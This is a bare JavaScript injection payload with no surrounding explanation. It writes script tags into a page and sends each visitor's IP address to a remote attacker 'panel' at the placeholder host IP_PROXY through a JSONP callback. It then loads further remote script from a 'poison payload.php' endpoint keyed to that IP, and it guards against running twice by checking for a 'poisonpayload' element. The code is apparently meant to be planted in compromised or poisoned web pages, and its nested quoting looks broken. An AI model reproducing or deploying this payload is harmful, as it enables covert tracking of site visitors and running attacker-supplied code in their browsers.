function payload() {
  x = document.getElementById("poisonpayload");
  if (x == null) {
    document.write(
      "<script>function getip(json){
        document.write('<script type=\\\"application/javascript\\\" src=\\\"http://IP_PROXY/panel/poison payload.php?id=\' + json.ip + \'\\\"></scr\' + \'ipt>');
      };</script>");
    document.write("<script id='poisonpayload' type='application/javascript' src='http://IP_PROXY/panel/jsonip.php?callback=getip'></script>");
  }
}
payload();
